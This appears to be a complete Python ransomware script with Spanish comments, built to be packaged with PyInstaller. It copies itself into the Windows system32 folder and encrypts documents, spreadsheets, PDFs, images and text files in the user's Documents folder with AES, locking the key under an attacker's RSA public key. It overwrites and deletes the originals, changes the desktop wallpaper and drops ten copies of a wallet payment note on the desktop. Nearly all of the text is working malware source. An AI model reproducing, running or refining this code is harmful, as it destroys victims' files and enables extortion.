import os
import base64
import shutil
import ctypes
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives import serialization, hashes
import sys

# Función para generar una clave AES aleatoria de 256 bits
def generar_clave_aes():
    return get_random_bytes(32)  # 32 bytes = 256 bits

# Función para cifrar la clave AES con RSA utilizando la llave pública proporcionada
def cifrar_clave_aes_rsa(clave_aes, public_key_pem):
    public_key = serialization.load_pem_public_key(public_key_pem.encode(), backend=default_backend())
    clave_cifrada = public_key.encrypt(
        clave_aes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return base64.b64encode(clave_cifrada).decode()

# Función para leer la clave pública desde un archivo
def leer_clave_publica():
    # Si estamos en PyInstaller, usar la carpeta _MEIPASS para acceder al archivo
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))

    # Ruta completa del archivo 'public_key.pem'
    ruta_clave_publica = os.path.join(base_path, 'public_key.pem')

    # Leer el contenido del archivo
    with open(ruta_clave_publica, 'r') as f:
        public_key_pem = f.read()

    return public_key_pem

# Función para cifrar archivos con AES
def cifrar_archivo_aes(archivo, clave_aes):
    cipher = AES.new(clave_aes, AES.MODE_CBC)
    iv = cipher.iv
    with open(archivo, 'rb') as f:
        datos = f.read()

    datos_cifrados = cipher.encrypt(pad(datos, AES.block_size))
    with open(archivo + '.owo', 'wb') as f:
        f.write(iv + datos_cifrados)

# Función para borrar un archivo de forma segura
def borrar_archivo_seguro(archivo):
    # Sobrescribir el archivo con datos aleatorios antes de eliminarlo
    with open(archivo, 'ba+', buffering=0) as f:
        length = f.tell()
        f.seek(0)
        f.write(os.urandom(length))  # Sobrescribir con datos aleatorios

    # Eliminar el archivo después de sobrescribirlo
    os.remove(archivo)

# Función para copiar el ejecutable a la carpeta system32
def copiar_ejecutable_a_system32():
    windir = os.environ['WINDIR']
    system32_path = os.path.join(windir, 'system32')
    
    # Obtener la ruta del ejecutable actual (en el caso de PyInstaller)
    if getattr(sys, 'frozen', False):
        current_executable = sys.executable  # El ejecutable generado por PyInstaller
    else:
        current_executable = os.path.abspath(__file__)  # Caso normal para scripts no empaquetados
    
    # Copiar el ejecutable a la ruta system32
    shutil.copy(current_executable, system32_path)

# Función para cambiar el fondo de escritorio
def cambiar_fondo_escritorio(ruta_imagen):
    image_path = os.path.abspath(ruta_imagen)
    
    # Cambiar el fondo de escritorio usando SystemParametersInfoW
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)

# Obtener la ruta de la imagen empaquetada con pyinstaller
def obtener_ruta_imagen_empaquetada():
    # Si el script se está ejecutando desde un .exe empaquetado
    if getattr(sys, '_MEIPASS', False):
        return os.path.join(sys._MEIPASS, 'fondo.png')  # Nombre de la imagen
    else:
        return 'fondo.png'  # Ruta alternativa si no está empaquetada

# Función para copiar el archivo wallet.txt al escritorio 10 veces, aumentando las "t"s
def copiar_wallet_al_escritorio():
    user_profile = os.environ['USERPROFILE']
    desktop_dir = os.path.join(user_profile, 'Desktop')  # Ruta del escritorio

    # Ruta al archivo original wallet.txt (obtenido desde PyInstaller)
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))

    wallet_path = os.path.join(base_path, 'wallet.txt')

    for i in range(10):
        # Crear el nombre del archivo con un número creciente de 't's
        nombre_archivo = f"wallett{'t' * i}.txt"
        ruta_destino = os.path.join(desktop_dir, nombre_archivo)

        # Copiar wallet.txt al escritorio con el nuevo nombre
        shutil.copy(wallet_path, ruta_destino)


 

# Obtener el directorio "Documents" del usuario
user_profile = os.environ['USERPROFILE']
documents_dir = os.path.join(user_profile, 'Documents')

# Copiar el ejecutable a la carpeta system32
copiar_ejecutable_a_system32()

# Extensiones que se desean cifrar
extensions = ['.docx', '.xlsx', '.pdf', '.jpeg', '.jpg', '.txt']

# Generar clave AES
clave_aes = generar_clave_aes()

# Llave pública proporcionada (en formato PKCS#8).
# Leer la clave pública desde el archivo
public_key_pem = leer_clave_publica()

# Cifrar la clave AES con RSA
clave_aes_cifrada = cifrar_clave_aes_rsa(clave_aes, public_key_pem)

# Guardar la clave cifrada en un archivo
with open(os.path.join(documents_dir, 'clave_aes_cifrada.lol'), 'w') as f:
    f.write(clave_aes_cifrada)

# Cifrar los archivos seleccionados
for foldername, subfolders, filenames in os.walk(documents_dir):
    for filename in filenames:
        if any(filename.endswith(ext) for ext in extensions):
            file_path = os.path.join(foldername, filename)
            # Cifrar el archivo con AES
            cifrar_archivo_aes(file_path, clave_aes)
            # Borrar de forma segura el archivo original
            borrar_archivo_seguro(file_path)

# Cambiar el fondo de escritorio al final
ruta_imagen = obtener_ruta_imagen_empaquetada()
cambiar_fondo_escritorio(ruta_imagen)

# Copiar wallet.txt al escritorio 10 veces
copiar_wallet_al_escritorio()
